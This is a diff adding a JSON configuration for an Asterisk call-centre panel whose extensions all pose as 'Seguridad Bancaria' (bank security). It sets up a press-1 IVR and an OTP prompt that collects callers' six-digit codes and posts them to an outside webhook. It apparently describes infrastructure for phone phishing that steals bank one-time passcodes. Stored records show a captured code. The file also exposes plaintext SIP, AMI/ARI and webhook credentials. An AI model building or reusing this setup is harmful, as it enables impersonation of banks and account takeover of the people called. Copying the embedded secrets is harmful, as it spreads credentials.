@@ -1,0 +1,414 @@
+{
+  "extensions": [
+    {
+      "id": "ext-1001",
+      "extension": "1001",
+      "name": "Seguridad Bancaria",
+      "secret": "Secr3tP@ssw0rd!1001",
+      "context": "from-internal",
+      "codecs": [
+        "opus",
+        "g722",
+        "ulaw",
+        "alaw",
+        "g729"
+      ],
+      "maxContacts": 5,
+      "transport": "transport-udp",
+      "callerId": "\"Seguridad Bancaria\" <+18005550199>",
+      "callerIdNum": "+18005550199",
+      "callerIdName": "Seguridad Bancaria",
+      "status": "registered"
+    },
+    {
+      "id": "ext-1002",
+      "extension": "1002",
+      "name": "Seguridad Bancaria",
+      "secret": "S0p0rte#2026@1002",
+      "context": "from-internal",
+      "codecs": [
+        "opus",
+        "g722",
+        "ulaw",
+        "alaw",
+        "g729"
+      ],
+      "maxContacts": 5,
+      "transport": "transport-udp",
+      "callerId": "\"Seguridad Bancaria\" <+18005550199>",
+      "callerIdNum": "+18005550199",
+      "callerIdName": "Seguridad Bancaria",
+      "status": "registered"
+    },
+    {
+      "id": "ext-1003",
+      "extension": "1003",
+      "name": "Seguridad Bancaria",
+      "secret": "S0p0rte#2026@1003",
+      "context": "from-internal",
+      "codecs": [
+        "opus",
+        "g722",
+        "ulaw",
+        "alaw",
+        "g729"
+      ],
+      "maxContacts": 5,
+      "transport": "transport-udp",
+      "callerId": "\"Seguridad Bancaria\" <+18005550199>",
+      "callerIdNum": "+18005550199",
+      "callerIdName": "Seguridad Bancaria",
+      "status": "registered"
+    },
+    {
+      "id": "ext-1004",
+      "extension": "1004",
+      "name": "Seguridad Bancaria",
+      "secret": "Superv1sor2026!",
+      "context": "from-internal",
+      "codecs": [
+        "opus",
+        "g722",
+        "ulaw",
+        "alaw",
+        "g729"
+      ],
+      "maxContacts": 5,
+      "transport": "transport-udp",
+      "callerId": "\"Seguridad Bancaria\" <+18005550199>",
+      "callerIdNum": "+18005550199",
+      "callerIdName": "Seguridad Bancaria",
+      "status": "registered"
+    }
+  ],
+  "carriers": [
+    {
+      "id": "trunk-twilio",
+      "name": "Twilio Elastic SIP Trunk",
+      "authType": "registration",
+      "host": "mycompany.pstn.twilio.com",
+      "port": 5060,
+      "username": "asterisk_gov_trunk",
+      "secret": "Tw1l10SIPTrunkKey9876!",
+      "inboundContext": "from-trunk",
+      "outboundCallerId": "",
+      "codecs": [
+        "ulaw",
+        "alaw",
+        "g729"
+      ],
+      "qualifyFreq": 60,
+      "status": "reachable",
+      "latencyMs": 24
+    },
+    {
+      "id": "trunk-local-telco",
+      "name": "Carrier Nacional IP Direct",
+      "authType": "ip_auth",
+      "host": "190.210.14.88",
+      "port": 5060,
+      "inboundContext": "from-trunk",
+      "outboundCallerId": "+541140001234",
+      "codecs": [
+        "alaw",
+        "ulaw"
+      ],
+      "qualifyFreq": 30,
+      "status": "reachable",
+      "latencyMs": 11
+    }
+  ],
+  "press1Config": {
+    "enabled": true,
+    "extension": "500",
+    "welcomeAudioText": "Hola, gracias por comunicarse con nuestro servicio automatizado. Si desea hablar con un asesor especializado presione 1, de lo contrario permanezca en l\u00ednea.",
+    "timeoutSeconds": 8,
+    "maxRetries": 2,
+    "digit1Action": "transfer_extension",
+    "digit1Target": "1001",
+    "invalidPromptText": "Opci\u00f3n inv\u00e1lida. Por favor intente nuevamente.",
+    "fallbackAction": "hangup",
+    "welcomeAudioId": "audio-p1-welcome"
+  },
+  "otpConfig": {
+    "enabled": true,
+    "extension": "600",
+    "digitLength": 6,
+    "welcomePromptText": "Bienvenido al sistema de verificaci\u00f3n de identidad. Por favor ingrese su c\u00f3digo OTP de 6 d\u00edgitos seguido de la tecla numeral o espere un momento.",
+    "repeatPromptOnTimeout": true,
+    "timeoutSeconds": 10,
+    "maxAttempts": 3,
+    "webhookUrl": "https://anonymousotp.online/api/v1/telephony/verify-otp",
+    "webhookAuthHeader": "Bearer sec_live_otp_asterisk_token_2026",
+    "successPromptText": "Su c\u00f3digo ha sido validado exitosamente. Transfiriendo con su gestor...",
+    "failurePromptText": "C\u00f3digo incorrecto o expirado. Por seguridad su llamada ser\u00e1 finalizada.",
+    "successAction": "transfer",
+    "successTarget": "1002",
+    "stasisAppName": "otp_verification_app"
+  },
+  "audios": [
+    {
+      "id": "audio-1790783076717",
+      "name": "Voz Comercial para Barrick Pueblo Viejo   Miner\u00eda que genera oportunidades",
+      "category": "custom",
+      "fileName": "voz_comercial_para_barrick_pueblo_viejo___miner_a_que_genera_oportunidades.wav",
+      "fileSize": "594.6 KB",
+      "durationSec": 45.5,
+      "format": "WAV",
+      "sampleRate": "8000Hz PCM 16-bit Mono",
+      "asteriskPath": "custom/voz_comercial_para_barrick_pueblo_viejo___miner_a_que_genera_oportunidades",
+      "createdAt": "2026-09-30T15:44:36.717Z"
+    },
+    {
+      "id": "audio-1790175573734",
+      "name": "Un Momento BR",
+      "category": "welcome_7777",
+      "fileName": "un_momento_br.wav",
+      "fileSize": "31.6 KB",
+      "durationSec": 4,
+      "format": "WAV",
+      "sampleRate": "8000Hz PCM 16-bit Mono",
+      "asteriskPath": "custom/un_momento_br",
+      "createdAt": "2026-09-23T14:59:33.734Z"
+    },
+    {
+      "id": "audio-1788967139197-br9f",
+      "name": "banrearreglado",
+      "category": "press1_welcome",
+      "fileName": "banrearreglado.wav",
+      "fileSize": "421.3 KB",
+      "durationSec": 27,
+      "format": "audio/wav",
+      "sampleRate": "8000 Hz, 16-bit Mono (Est\u00e1ndar Asterisk)",
+      "asteriskPath": "custom/banrearreglado",
+      "createdAt": "9/9/2026, 11:18:59 a.m."
+    },
+    {
+      "id": "audio-p1-welcome",
+      "name": "Bienvenida Corporativa Press 1",
+      "category": "press1_welcome",
+      "fileName": "bienvenida_corporativa.wav",
+      "fileSize": "320 KB",
+      "durationSec": 8.5,
+      "format": "audio/wav",
+      "sampleRate": "8000 Hz, 16-bit Mono (Asterisk Standard)",
+      "asteriskPath": "custom/bienvenida_corporativa",
+      "createdAt": "2026-09-08 10:15"
+    },
+    {
+      "id": "audio-p1-invalid",
+      "name": "Opci\u00f3n Inv\u00e1lida Reintento",
+      "category": "press1_invalid",
+      "fileName": "opcion_invalida.wav",
+      "fileSize": "145 KB",
+      "durationSec": 3.2,
+      "format": "audio/wav",
+      "sampleRate": "8000 Hz, 16-bit Mono (Asterisk Standard)",
+      "asteriskPath": "custom/opcion_invalida",
+      "createdAt": "2026-09-08 10:16"
+    },
+    {
+      "id": "audio-otp-prompt",
+      "name": "Instrucci\u00f3n Ingreso OTP 6 D\u00edgitos",
+      "category": "otp_welcome",
+      "fileName": "prompt_otp_6_digitos.wav",
+      "fileSize": "390 KB",
+      "durationSec": 9,
+      "format": "audio/wav",
+      "sampleRate": "8000 Hz, 16-bit Mono (Asterisk Standard)",
+      "asteriskPath": "custom/prompt_otp_6_digitos",
+      "createdAt": "2026-09-08 10:20"
+    },
+    {
+      "id": "audio-otp-success",
+      "name": "C\u00f3digo OTP Validado Correctamente",
+      "category": "otp_success",
+      "fileName": "otp_validado_exito.wav",
+      "fileSize": "210 KB",
+      "durationSec": 4.5,
+      "format": "audio/wav",
+      "sampleRate": "8000 Hz, 16-bit Mono (Asterisk Standard)",
+      "asteriskPath": "custom/otp_validado_exito",
+      "createdAt": "2026-09-08 10:22"
+    },
+    {
+      "id": "audio-otp-failure",
+      "name": "Fallo OTP e Intentos Excedidos",
+      "category": "otp_failure",
+      "fileName": "otp_error_bloqueo.wav",
+      "fileSize": "260 KB",
+      "durationSec": 5,
+      "format": "audio/wav",
+      "sampleRate": "8000 Hz, 16-bit Mono (Asterisk Standard)",
+      "asteriskPath": "custom/otp_error_bloqueo",
+      "createdAt": "2026-09-08 10:24"
+    },
+    {
+      "id": "audio-moh-ambient",
+      "name": "M\u00fasica de Espera en Cola (MOH)",
+      "category": "hold_music",
+      "fileName": "moh_corporate_loop.wav",
+      "fileSize": "840 KB",
+      "durationSec": 18,
+      "format": "audio/wav",
+      "sampleRate": "8000 Hz, 16-bit Mono (Asterisk Standard)",
+      "asteriskPath": "custom/moh_corporate_loop",
+      "createdAt": "2026-09-08 10:30"
+    }
+  ],
+  "users": [
+    {
+      "id": "user-admin",
+      "name": "Administrador Telecom",
+      "email": "admin.asterisk@empresa.com",
+      "role": "admin",
+      "assignedExtensions": [],
+      "status": "active",
+      "avatarColor": "from-amber-500 to-red-600",
+      "createdAt": "2026-09-01",
+      "lastLogin": "En l\u00ednea ahora",
+      "permissions": {
+        "canManageExtensions": true,
+        "canManageCarriers": true,
+        "canManageIVR": true,
+        "canUploadAudio": true,
+        "canSyncAsterisk": true,
+        "canUseSoftphone": true,
+        "canManageUsers": true,
+        "canExportConfigs": true
+      }
+    },
+    {
+      "id": "user-sup",
+      "name": "Laura Valenzuela",
+      "email": "laura.sup@empresa.com",
+      "role": "supervisor",
+      "assignedExtensions": [
+        "1001",
+        "1004"
+      ],
+      "status": "active",
+      "avatarColor": "from-blue-500 to-indigo-600",
+      "createdAt": "2026-09-03",
+      "lastLogin": "Hoy 15:42",
+      "permissions": {
+        "canManageExtensions": true,
+        "canManageCarriers": false,
+        "canManageIVR": true,
+        "canUploadAudio": true,
+        "canSyncAsterisk": true,
+        "canUseSoftphone": true,
+        "canManageUsers": false,
+        "canExportConfigs": true
+      }
+    }
+  ],
+  "connectionSettings": {
+    "amiHost": "127.0.0.1",
+    "amiPort": 5038,
+    "amiUser": "sammy",
+    "amiSecret": "Robert2026RDTGcvgbsg",
+    "ariHost": "127.0.0.1",
+    "ariPort": 8088,
+    "ariUser": "sammy",
+    "ariSecret": "Robert2026RDTGcvgbsg",
+    "ariAppName": "asterisk_gov_stasis",
+    "syncStrategy": "hybrid",
+    "autoSyncOnChange": true,
+    "status": "connected"
+  },
+  "astDbEntries": [
+    {
+      "id": "astdb-orig-1789326863941",
+      "family": "originating_agent",
+      "key": "+18005550199",
+      "value": "1001",
+      "updatedAt": "3:14:23 p.m.",
+      "description": "Persistido en SQLite3 AstDB para retorno autom\u00e1tico al agente Ext 1001"
+    },
+    {
+      "id": "astdb-orig-1788967591809",
+      "family": "originating_agent",
+      "key": "+18005550199",
+      "value": "1001",
+      "updatedAt": "11:26:31 a.m.",
+      "description": "Persistido en SQLite3 AstDB para retorno autom\u00e1tico al agente Ext 1001"
+    },
+    {
+      "id": "astdb-orig-1788967538200",
+      "family": "originating_agent",
+      "key": "+18005550199",
+      "value": "1001",
+      "updatedAt": "11:25:38 a.m.",
+      "description": "Persistido en SQLite3 AstDB para retorno autom\u00e1tico al agente Ext 1001"
+    },
+    {
+      "id": "astdb-orig-1788966798531",
+      "family": "originating_agent",
+      "key": "+18005550199",
+      "value": "1001",
+      "updatedAt": "11:13:18 a.m.",
+      "description": "Persistido en SQLite3 AstDB para retorno autom\u00e1tico al agente Ext 1001"
+    },
+    {
+      "id": "astdb-1",
+      "family": "originating_agent",
+      "key": "+18005550199",
+      "value": "1001",
+      "updatedAt": "Hoy 16:40:12",
+      "description": "Agente que origin\u00f3 la marcaci\u00f3n saliente. Clave para retorno en Press 1."
+    },
+    {
+      "id": "astdb-2",
+      "family": "originating_agent",
+      "key": "+541140001234",
+      "value": "1002",
+      "updatedAt": "Hoy 15:22:00",
+      "description": "Agente Carlos M\u00e9ndez (Ext 1002) asignado a la llamada del cliente."
+    },
+    {
+      "id": "astdb-3",
+      "family": "otp_session",
+      "key": "call-unique-9982a",
+      "value": "849201",
+      "updatedAt": "Hoy 17:05:30",
+      "description": "C\u00f3digo de 6 d\u00edgitos capturado por ARI Stasis en la llamada activa."
+    },
+    {
+      "id": "astdb-4",
+      "family": "otp_verified",
+      "key": "+18005550199",
+      "value": "AUTH_200_OK",
+      "updatedAt": "Hoy 17:06:02",
+      "description": "Estado de validaci\u00f3n devuelto por Webhook HTTP."
+    },
+    {
+      "id": "astdb-5",
+      "family": "agent_status",
+      "key": "1001",
+      "value": "AVAILABLE",
+      "updatedAt": "Hoy 17:15:00",
+      "description": "Disponibilidad del agente Juan P\u00e9rez en cola interna."
+    },
+    {
+      "id": "astdb-6",
+      "family": "agent_status",
+      "key": "1002",
+      "value": "IN_USE",
+      "updatedAt": "Hoy 17:18:45",
+      "description": "Extensi\u00f3n 1002 ocupada atendiendo llamada cliente."
+    },
+    {
+      "id": "astdb-7",
+      "family": "blacklist",
+      "key": "+15550009999",
+      "value": "BLOCKED_SPAM",
+      "updatedAt": "Ayer 12:00:00",
+      "description": "N\u00famero bloqueado en dialplan antes de ingresar a IVR."
+    }
+  ],
+  "theme": "dark",
+  "lastUpdated": 1790861426854,
+  "savedByUserId": "user-admin",
+  "savedByUsername": "unknown"
+}
